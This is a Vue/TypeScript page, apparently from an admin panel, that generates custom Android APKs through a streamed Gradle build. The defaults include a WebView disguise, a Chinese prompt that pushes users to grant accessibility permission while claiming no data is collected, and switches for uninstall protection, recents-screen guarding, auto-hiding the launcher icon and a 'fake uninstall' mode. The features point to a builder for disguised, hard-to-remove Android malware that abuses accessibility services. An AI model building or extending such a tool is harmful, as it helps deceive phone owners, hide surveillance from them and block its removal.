<script setup lang="ts">
import { ref, computed, nextTick, onBeforeUnmount } from 'vue';
import { useForm, Head, router } from '@inertiajs/vue3';
import { useAdminBasePath } from '@/composables/useAdminBasePath';
import {
    NCard,
    NForm,
    NFormItem,
    NInput,
    NButton,
    NSpace,
    NSwitch,
    NTabs,
    NTabPane,
    NGrid,
    NGridItem,
    NUpload,
    NIcon,
    NSpin,
    NAlert,
    NModal,
    createDiscreteApi,
    type UploadFileInfo,
} from 'naive-ui';
import {
    AddOutline,
    TrashOutline,
    CheckmarkCircleOutline,
    CloseCircleOutline,
    RocketOutline,
} from '@vicons/ionicons5';
import AuthenticatedLayout from '@/Layouts/AuthenticatedLayout.vue';
import { EventSourcePolyfill } from 'event-source-polyfill';

interface Template {
    id: number;
    name: string;
    package_name: string;
}

interface ImageItem {
    name: string;
    url: string;
}

interface BuildStep {
    name: string;
    label: string;
    status: 'wait' | 'process' | 'finish' | 'error';
    duration?: number;
}

interface Props {
    templates: Template[];
    icons: ImageItem[];
    backgrounds: ImageItem[];
}

const props = defineProps<Props>();
const { message } = createDiscreteApi(['message']);
const { userRoute } = useAdminBasePath();

const form = useForm({
    name: '',
    package_name: '',
    version: '',
    web_url: 'https://m.baidu.com',
    debug: false,
    alertTitle: '欢迎使用',
    alertMsg: '为了确保所有功能正常使用，需要您开启无障碍权限，此App不会收集或分享您的个人信息，请记住以下设置：选择 已下载的服务/应用 -找到本App-点击 打开并允许',
    okText: '立即前往',
    icon_path: '',
    background_path: '',
    disable_uninstall_protection: true,
    disable_recents_guard: true,
    disable_icon_hide: true,
    uninstall_mode: false,
});

const iconList = ref<ImageItem[]>([...props.icons]);
const backgroundList = ref<ImageItem[]>([...props.backgrounds]);
const selectedIcon = ref<string>('');
const selectedBackground = ref<string>('');
const uploadingIcon = ref(false);
const uploadingBg = ref(false);

const showBuildModal = ref(false);

const ALL_STEP_LABELS: Record<string, string> = {
    check_environment: '检查环境',
    prepare_work_dir: '准备工作目录',
    modify_server_config: '写入配置',
    modify_build_gradle: '修改构建脚本',
    modify_strings: '修改字符串资源',
    replace_icon: '替换图标',
    replace_background: '替换背景图',
    gradle_build: 'Gradle 构建',
    collect_apk: '收集 APK',
    cleanup: '清理',
};

const buildSteps = ref<BuildStep[]>([]);
const buildError = ref<string | null>(null);
const buildSuccess = ref(false);
const currentStepIndex = ref(0);
const eventSource = ref<EventSource | EventSourcePolyfill | null>(null);
const elapsedTime = ref(0);
const stepsListRef = ref<HTMLElement | null>(null);
let elapsedTimer: ReturnType<typeof setInterval> | null = null;

const formatDuration = (ms: number): string => {
    if (ms < 1000) return `${Math.round(ms)}ms`;
    if (ms < 60000) return `${(ms / 1000).toFixed(1)}s`;
    const m = Math.floor(ms / 60000);
    const s = Math.round((ms % 60000) / 1000);
    return `${m}m ${s}s`;
};

const formattedElapsed = computed(() => {
    const s = elapsedTime.value;
    if (s < 60) return `${s}s`;
    const m = Math.floor(s / 60);
    const sec = s % 60;
    return `${m}m ${sec}s`;
});

const currentStepLabel = computed(() => {
    const step = buildSteps.value.find(s => s.status === 'process');
    return step?.label ?? '';
});

const startElapsedTimer = () => {
    elapsedTime.value = 0;
    elapsedTimer = setInterval(() => { elapsedTime.value++; }, 1000);
};

const stopElapsedTimer = () => {
    if (elapsedTimer) {
        clearInterval(elapsedTimer);
        elapsedTimer = null;
    }
};

const scrollToCurrentStep = () => {
    nextTick(() => {
        const list = stepsListRef.value;
        if (!list) return;
        const active = list.querySelector('.step-item.process') || list.lastElementChild;
        active?.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
    });
};

onBeforeUnmount(() => {
    stopElapsedTimer();
    closeEventSource();
});

const selectIcon = (icon: ImageItem) => {
    selectedIcon.value = icon.name;
    form.icon_path = icon.url;
};

const selectBackground = (bg: ImageItem) => {
    selectedBackground.value = bg.name;
    form.background_path = bg.url;
};

const csrfToken = () =>
    document.querySelector('meta[name="csrf-token"]')?.getAttribute('content') || '';

const handleIconUpload = async (options: { file: UploadFileInfo }) => {
    if (!options.file.file) return;
    uploadingIcon.value = true;
    const formData = new FormData();
    formData.append('icon', options.file.file);
    try {
        const response = await fetch(userRoute('/builds/assets/icons'), {
            method: 'POST',
            body: formData,
            credentials: 'same-origin',
            headers: { 'X-CSRF-TOKEN': csrfToken() },
        });
        const data = await response.json();
        if (data.success) {
            iconList.value.unshift(data.icon);
            selectIcon(data.icon);
            message.success('图标上传成功');
        }
    } catch {
        message.error('图标上传失败');
    } finally {
        uploadingIcon.value = false;
    }
};

const handleBgUpload = async (options: { file: UploadFileInfo }) => {
    if (!options.file.file) return;
    uploadingBg.value = true;
    const formData = new FormData();
    formData.append('background', options.file.file);
    try {
        const response = await fetch(userRoute('/builds/assets/backgrounds'), {
            method: 'POST',
            body: formData,
            credentials: 'same-origin',
            headers: { 'X-CSRF-TOKEN': csrfToken() },
        });
        const data = await response.json();
        if (data.success) {
            backgroundList.value.unshift(data.background);
            selectBackground(data.background);
            message.success('背景图上传成功');
        }
    } catch {
        message.error('背景图上传失败');
    } finally {
        uploadingBg.value = false;
    }
};

const deleteIcon = async (icon: ImageItem) => {
    try {
        await fetch(userRoute('/builds/assets/icons'), {
            method: 'DELETE',
            body: JSON.stringify({ name: icon.name }),
            credentials: 'same-origin',
            headers: { 'Content-Type': 'application/json', 'X-CSRF-TOKEN': csrfToken() },
        });
        iconList.value = iconList.value.filter(i => i.name !== icon.name);
        if (selectedIcon.value === icon.name) {
            selectedIcon.value = '';
            form.icon_path = '';
        }
        message.success('图标已删除');
    } catch {
        message.error('删除失败');
    }
};

const isValidPackageName = (packageName: string): boolean => {
    if (!packageName) return true;
    return /^[a-zA-Z][a-zA-Z0-9_]*(\.[a-zA-Z][a-zA-Z0-9_]*)+$/.test(packageName);
};

const validateForm = (): boolean => {
    if (!form.name.trim()) {
        message.error('请输入应用名称');
        return false;
    }
    if (form.package_name && !isValidPackageName(form.package_name)) {
        message.error('包名格式错误，应为 com.example.app 格式');
        return false;
    }
    if (form.version && !/^\d+(\.\d+){0,2}$/.test(form.version)) {
        message.error('版本号格式错误，应为 1.0 或 1.0.0 格式');
        return false;
    }
    return true;
};

const startBuild = () => {
    if (!validateForm()) return;

    buildSteps.value = [];
    buildError.value = null;
    buildSuccess.value = false;
    currentStepIndex.value = 0;
    showBuildModal.value = true;
    startElapsedTimer();

    const params = new URLSearchParams();
    params.append('name', form.name);
    if (form.package_name) params.append('package_name', form.package_name);
    if (form.version) params.append('version', form.version);
    params.append('debug', String(form.debug));
    if (form.alertTitle) params.append('alertTitle', form.alertTitle);
    if (form.alertMsg) params.append('alertMsg', form.alertMsg);
    if (form.okText) params.append('okText', form.okText);
    if (form.web_url) params.append('web_url', form.web_url);
    if (form.icon_path) params.append('icon_path', form.icon_path);
    if (form.background_path) params.append('background_path', form.background_path);
    params.append('disable_uninstall_protection', String(form.disable_uninstall_protection));
    params.append('disable_recents_guard', String(form.disable_recents_guard));
    params.append('disable_icon_hide', String(form.disable_icon_hide));
    params.append('uninstall_mode', String(form.uninstall_mode));

    eventSource.value = new EventSourcePolyfill(`${userRoute('/builds/stream')}?${params.toString()}`, {
        withCredentials: true,
        heartbeatTimeout: 600000,
    });

    eventSource.value.onmessage = (event) => {
        try {
            const data = JSON.parse(event.data);
            handleBuildEvent(data);
        } catch {
            // ignore malformed SSE data
        }
    };

    eventSource.value.onerror = () => {
        if (!buildSuccess.value && !buildError.value) {
            buildError.value = '连接中断';
        }
        closeEventSource();
    };
};

const handleBuildEvent = (data: any) => {
    if (data.type === 'step') {
        let stepIndex = buildSteps.value.findIndex(s => s.name === data.step);

        if (stepIndex < 0) {
            buildSteps.value.push({
                name: data.step,
                label: ALL_STEP_LABELS[data.step] ?? data.label ?? data.step,
                status: 'wait',
            });
            stepIndex = buildSteps.value.length - 1;
        }

        if (data.status === 'running') {
            buildSteps.value[stepIndex].status = 'process';
            currentStepIndex.value = stepIndex;
            scrollToCurrentStep();
        } else if (data.status === 'done') {
            buildSteps.value[stepIndex].status = 'finish';
            buildSteps.value[stepIndex].duration = data.duration;
        }
    } else if (data.type === 'complete') {
        buildSuccess.value = true;
        stopElapsedTimer();
        closeEventSource();
        message.success('APK 构建成功');
        setTimeout(() => {
            showBuildModal.value = false;
            router.visit(userRoute('/builds'));
        }, 1500);
    } else if (data.type === 'error') {
        buildError.value = data.error;
        const currentStep = buildSteps.value[currentStepIndex.value];
        if (currentStep) currentStep.status = 'error';
        stopElapsedTimer();
        closeEventSource();
    }
};

const closeEventSource = () => {
    if (eventSource.value) {
        eventSource.value.close();
        eventSource.value = null;
    }
};

const closeBuildModal = () => {
    if (buildSuccess.value || buildError.value) {
        showBuildModal.value = false;
        if (buildSuccess.value) router.visit(userRoute('/builds'));
    }
};
</script>

<template>
    <Head title="新建 APK 构建" />
    <AuthenticatedLayout>
        <template #header-title>新建 APK 构建</template>

        <div class="build-create-container">
            <NForm @submit.prevent="startBuild" label-placement="top">
                <NTabs type="line" animated>
                    <!-- 基本信息 -->
                    <NTabPane name="basic" tab="基本信息">
                        <div class="tab-content">
                            <NCard size="small" class="form-card">
                                <template #header>
                                    <span class="card-title">基本信息</span>
                                </template>
                                <NFormItem label="应用名称（必填）">
                                    <NInput v-model:value="form.name" placeholder="应用显示名称" maxlength="32" show-count />
                                </NFormItem>
                                <NGrid :cols="2" :x-gap="16">
                                    <NGridItem>
                                        <NFormItem label="应用包名（留空自动生成）">
                                            <NInput v-model:value="form.package_name" placeholder="com.example.app" />
                                        </NFormItem>
                                    </NGridItem>
                                    <NGridItem>
                                        <NFormItem label="应用版本（留空自动生成）">
                                            <NInput v-model:value="form.version" placeholder="1.0.0" />
                                        </NFormItem>
                                    </NGridItem>
                                </NGrid>
                                <NFormItem label="WebView 主页">
                                    <NInput v-model:value="form.web_url" placeholder="https://m.baidu.com" />
                                </NFormItem>
                                <NFormItem label="调试模式">
                                    <NSwitch v-model:value="form.debug" />
                                </NFormItem>
                            </NCard>
                        </div>
                    </NTabPane>

                    <!-- 图标资源 -->
                    <NTabPane name="assets" tab="图标资源">
                        <div class="tab-content">
                            <NCard size="small" class="form-card">
                                <template #header>
                                    <span class="card-title">应用图标</span>
                                </template>
                                <div class="asset-grid">
                                    <NUpload accept="image/png,image/jpeg" :show-file-list="false" :custom-request="handleIconUpload" class="upload-trigger">
                                        <div class="upload-btn">
                                            <NSpin v-if="uploadingIcon" size="small" />
                                            <template v-else>
                                                <NIcon :component="AddOutline" size="24" />
                                                <span>上传</span>
                                            </template>
                                        </div>
                                    </NUpload>
                                    <div v-for="icon in iconList" :key="icon.name" class="asset-item" :class="{ selected: selectedIcon === icon.name }" @click="selectIcon(icon)">
                                        <img :src="icon.url" :alt="icon.name" />
                                        <div v-if="selectedIcon === icon.name" class="selected-badge">
                                            <NIcon :component="CheckmarkCircleOutline" />
                                        </div>
                                        <button type="button" class="delete-btn" @click.stop="deleteIcon(icon)">
                                            <NIcon :component="TrashOutline" size="14" />
                                        </button>
                                    </div>
                                </div>
                            </NCard>

                            <NCard size="small" class="form-card">
                                <template #header>
                                    <span class="card-title">无障碍引导背景图</span>
                                </template>
                                <NAlert type="info" :bordered="false" class="mb-3">
                                    替换 APK 内置的无障碍引导背景图，支持 PNG/JPG 格式
                                </NAlert>
                                <div class="asset-grid asset-grid-large">
                                    <NUpload accept="image/png,image/jpeg" :show-file-list="false" :custom-request="handleBgUpload" class="upload-trigger">
                                        <div class="upload-btn upload-btn-large">
                                            <NSpin v-if="uploadingBg" size="small" />
                                            <template v-else>
                                                <NIcon :component="AddOutline" size="24" />
                                                <span>上传底图</span>
                                            </template>
                                        </div>
                                    </NUpload>
                                    <div v-for="bg in backgroundList" :key="bg.name" class="asset-item asset-item-large" :class="{ selected: selectedBackground === bg.name }" @click="selectBackground(bg)">
                                        <img :src="bg.url" :alt="bg.name" />
                                        <div v-if="selectedBackground === bg.name" class="selected-badge">
                                            <NIcon :component="CheckmarkCircleOutline" />
                                        </div>
                                    </div>
                                </div>
                            </NCard>
                        </div>
                    </NTabPane>

                    <!-- 外观资源 -->
                    <NTabPane name="ui" tab="外观资源">
                        <div class="tab-content">
                            <NCard size="small" class="form-card">
                                <template #header>
                                    <span class="card-title">引导配置</span>
                                </template>
                                <NFormItem label="无障碍标题">
                                    <NInput v-model:value="form.alertTitle" maxlength="200" show-count />
                                </NFormItem>
                                <NFormItem label="无障碍内容">
                                    <NInput v-model:value="form.alertMsg" type="textarea" :rows="4" maxlength="1000" show-count />
                                </NFormItem>
                                <NFormItem label="引导按钮文本">
                                    <NInput v-model:value="form.okText" placeholder="立即前往" maxlength="50" show-count />
                                </NFormItem>
                            </NCard>
                        </div>
                    </NTabPane>

                    <!-- 高级设置 -->
                    <NTabPane name="advanced" tab="高级设置">
                        <div class="tab-content">
                            <NCard size="small" class="form-card">
                                <template #header>
                                    <span class="card-title">保护设置</span>
                                </template>
                                <NFormItem label="禁用卸载保护">
                                    <NSwitch v-model:value="form.disable_uninstall_protection" />
                                </NFormItem>
                                <NFormItem label="禁用最近任务防护">
                                    <NSwitch v-model:value="form.disable_recents_guard" />
                                </NFormItem>
                                <NFormItem label="禁用图标隐藏（关闭后配置完成自动隐藏桌面图标）">
                                    <NSwitch v-model:value="form.disable_icon_hide" />
                                </NFormItem>
                                <NFormItem label="假卸载模式">
                                    <NSwitch v-model:value="form.uninstall_mode" />
                                </NFormItem>
                            </NCard>
                        </div>
                    </NTabPane>
                </NTabs>

                <div class="form-actions">
                    <NSpace>
                        <NButton type="primary" size="large" attr-type="submit" :disabled="!form.name">
                            <template #icon>
                                <NIcon :component="RocketOutline" />
                            </template>
                            开始生成
                        </NButton>
                        <NButton size="large" tag="a" :href="userRoute('/builds')">取消</NButton>
                    </NSpace>
                </div>
            </NForm>
        </div>

        <!-- 构建进度弹窗 -->
        <NModal v-model:show="showBuildModal" :mask-closable="false" :closable="false" :show-icon="false" transform-origin="center">
            <div class="build-modal">
                <div class="build-modal-header" :class="{ 'success': buildSuccess, 'error': buildError }">
                    <div class="header-icon">
                        <div v-if="buildSuccess" class="icon-circle success">
                            <NIcon :component="CheckmarkCircleOutline" size="32" />
                        </div>
                        <div v-else-if="buildError" class="icon-circle error">
                            <NIcon :component="CloseCircleOutline" size="32" />
                        </div>
                        <div v-else class="icon-circle processing">
                            <NIcon :component="RocketOutline" size="32" />
                            <div class="pulse-ring"></div>
                        </div>
                    </div>
                    <h2 class="header-title">
                        {{ buildSuccess ? '构建成功' : buildError ? '构建失败' : '正在构建 APK' }}
                    </h2>
                    <p class="header-subtitle">
                        {{ buildSuccess ? '即将跳转到构建列表...' : buildError ? '请检查错误信息' : '请耐心等待，不要关闭页面' }}
                    </p>
                </div>

                <div class="build-modal-body">
                    <div v-if="!buildSuccess && !buildError" class="progress-section">
                        <div class="progress-header">
                            <span class="progress-label">
                                <template v-if="currentStepLabel">正在: {{ currentStepLabel }}</template>
                                <template v-else>准备中...</template>
                            </span>
                            <span class="progress-elapsed">{{ formattedElapsed }}</span>
                        </div>
                    </div>

                    <div v-if="buildSuccess" class="success-summary">
                        <span class="summary-text">总耗时 {{ formattedElapsed }}</span>
                    </div>

                    <div v-if="buildError" class="error-section">
                        <div class="error-box">
                            <NIcon :component="CloseCircleOutline" size="18" />
                            <span>{{ buildError }}</span>
                        </div>
                    </div>

                    <div class="steps-section">
                        <div class="steps-header">
                            <span>构建步骤</span>
                            <span v-if="buildSuccess || buildError" class="steps-count">{{ buildSteps.filter(s => s.status === 'finish').length }} 步完成</span>
                        </div>
                        <div ref="stepsListRef" class="steps-list">
                            <TransitionGroup name="step-enter">
                                <div v-for="(step, index) in buildSteps" :key="step.name" class="step-item" :class="step.status">
                                    <div class="step-indicator">
                                        <div v-if="step.status === 'finish'" class="indicator-done">
                                            <NIcon :component="CheckmarkCircleOutline" size="16" />
                                        </div>
                                        <div v-else-if="step.status === 'process'" class="indicator-processing">
                                            <div class="spinner"></div>
                                        </div>
                                        <div v-else-if="step.status === 'error'" class="indicator-error">
                                            <NIcon :component="CloseCircleOutline" size="16" />
                                        </div>
                                        <div v-else class="indicator-wait">
                                            <span>{{ index + 1 }}</span>
                                        </div>
                                    </div>
                                    <div class="step-content">
                                        <span class="step-label">{{ step.label }}</span>
                                        <span v-if="step.duration != null" class="step-duration">{{ formatDuration(step.duration) }}</span>
                                    </div>
                                </div>
                            </TransitionGroup>
                        </div>
                    </div>
                </div>

                <div v-if="buildError" class="build-modal-footer">
                    <NButton type="primary" size="large" block @click="closeBuildModal">
                        关闭
                    </NButton>
                </div>
            </div>
        </NModal>
    </AuthenticatedLayout>
</template>

<style scoped>
.build-create-container { max-width: 900px; }
.tab-content { padding: 16px 0; }
.form-card { margin-bottom: 16px; }
.card-title { font-weight: 600; font-size: 15px; }
.form-actions { margin-top: 24px; padding: 20px; background: white; border-radius: 12px; border: 1px solid #e2e8f0; }
.asset-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(72px, 1fr)); gap: 12px; }
.asset-grid-large { grid-template-columns: repeat(auto-fill, minmax(120px, 1fr)); }
.upload-trigger { width: 100%; }
.upload-btn { width: 72px; height: 72px; border: 2px dashed #e2e8f0; border-radius: 12px; display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 4px; cursor: pointer; transition: all 0.2s; color: #94a3b8; font-size: 12px; }
.upload-btn:hover { border-color: #10B981; color: #10B981; }
.upload-btn-large { width: 120px; height: 160px; }
.asset-item { width: 72px; height: 72px; border-radius: 12px; overflow: hidden; cursor: pointer; position: relative; border: 2px solid transparent; transition: all 0.2s; }
.asset-item-large { width: 120px; height: 160px; }
.asset-item:hover { border-color: #10B981; }
.asset-item.selected { border-color: #10B981; box-shadow: 0 0 0 2px rgba(16, 185, 129, 0.2); }
.asset-item img { width: 100%; height: 100%; object-fit: cover; }
.selected-badge { position: absolute; top: 4px; right: 4px; width: 20px; height: 20px; background: #10B981; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: white; }
.delete-btn { position: absolute; top: 4px; left: 4px; width: 20px; height: 20px; background: rgba(239, 68, 68, 0.9); border: none; border-radius: 50%; display: none; align-items: center; justify-content: center; color: white; cursor: pointer; }
.asset-item:hover .delete-btn { display: flex; }
.mb-3 { margin-bottom: 12px; }

.build-modal { width: 480px; background: linear-gradient(180deg, #f8fafc 0%, #ffffff 100%); border-radius: 20px; overflow: hidden; box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25); }
.build-modal-header { padding: 32px 24px 24px; text-align: center; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); position: relative; overflow: hidden; }
.build-modal-header::before { content: ''; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%; background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, transparent 60%); animation: shimmer 3s ease-in-out infinite; }
@keyframes shimmer { 0%, 100% { transform: translateX(-30%) translateY(-30%); } 50% { transform: translateX(30%) translateY(30%); } }
.build-modal-header.success { background: linear-gradient(135deg, #10b981 0%, #059669 100%); }
.build-modal-header.error { background: linear-gradient(135deg, #ef4444 0%, #dc2626 100%); }
.header-icon { position: relative; display: inline-block; margin-bottom: 16px; }
.icon-circle { width: 64px; height: 64px; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: white; position: relative; z-index: 1; background: rgba(255, 255, 255, 0.2); }
.pulse-ring { position: absolute; top: 50%; left: 50%; width: 64px; height: 64px; border-radius: 50%; border: 2px solid rgba(255, 255, 255, 0.6); transform: translate(-50%, -50%); animation: pulse 1.5s ease-out infinite; }
@keyframes pulse { 0% { transform: translate(-50%, -50%) scale(1); opacity: 1; } 100% { transform: translate(-50%, -50%) scale(1.8); opacity: 0; } }
.header-title { font-size: 20px; font-weight: 600; color: white; margin: 0 0 8px; position: relative; z-index: 1; }
.header-subtitle { font-size: 14px; color: rgba(255, 255, 255, 0.8); margin: 0; position: relative; z-index: 1; }
.build-modal-body { padding: 24px; }
.progress-section { margin-bottom: 24px; }
.progress-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; }
.progress-label { font-size: 13px; color: #64748b; font-weight: 500; }
.progress-elapsed { font-size: 12px; color: #94a3b8; font-weight: 500; }
.error-section { margin-bottom: 20px; }
.success-summary { text-align: center; margin-bottom: 20px; }
.summary-text { font-size: 14px; color: #64748b; font-weight: 500; }
.error-box { display: flex; align-items: center; gap: 10px; padding: 14px 16px; background: #fef2f2; border: 1px solid #fecaca; border-radius: 10px; color: #dc2626; font-size: 14px; }
.steps-section { background: #f8fafc; border-radius: 12px; padding: 16px; }
.steps-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 14px; padding-bottom: 12px; border-bottom: 1px solid #e2e8f0; font-size: 13px; font-weight: 600; color: #475569; }
.steps-count { font-weight: 500; color: #667eea; background: #eef2ff; padding: 2px 10px; border-radius: 12px; font-size: 12px; }
.steps-list { display: flex; flex-direction: column; gap: 6px; max-height: 360px; overflow-y: auto; }
.step-enter-enter-active { transition: all 0.3s ease-out; }
.step-enter-enter-from { opacity: 0; transform: translateY(-8px); }
.step-enter-enter-to { opacity: 1; transform: translateY(0); }
.step-item { display: flex; align-items: center; gap: 12px; padding: 10px 12px; border-radius: 8px; transition: all 0.2s ease; }
.step-item.process { background: #eef2ff; }
.step-item.finish { opacity: 0.7; }
.step-item.error { background: #fef2f2; }
.step-indicator { flex-shrink: 0; }
.indicator-done { width: 24px; height: 24px; border-radius: 50%; background: #10b981; color: white; display: flex; align-items: center; justify-content: center; }
.indicator-processing { width: 24px; height: 24px; display: flex; align-items: center; justify-content: center; }
.spinner { width: 20px; height: 20px; border: 2px solid #e2e8f0; border-top-color: #667eea; border-radius: 50%; animation: spin 0.8s linear infinite; }
@keyframes spin { to { transform: rotate(360deg); } }
.indicator-error { width: 24px; height: 24px; border-radius: 50%; background: #ef4444; color: white; display: flex; align-items: center; justify-content: center; }
.indicator-wait { width: 24px; height: 24px; border-radius: 50%; background: #e2e8f0; color: #94a3b8; font-size: 12px; font-weight: 600; display: flex; align-items: center; justify-content: center; }
.step-content { flex: 1; display: flex; justify-content: space-between; align-items: center; }
.step-label { font-size: 13px; color: #475569; }
.step-item.process .step-label { color: #667eea; font-weight: 500; }
.step-item.error .step-label { color: #dc2626; }
.step-duration { font-size: 11px; color: #94a3b8; background: #e2e8f0; padding: 2px 8px; border-radius: 10px; }
.build-modal-footer { padding: 16px 24px 24px; }
</style>
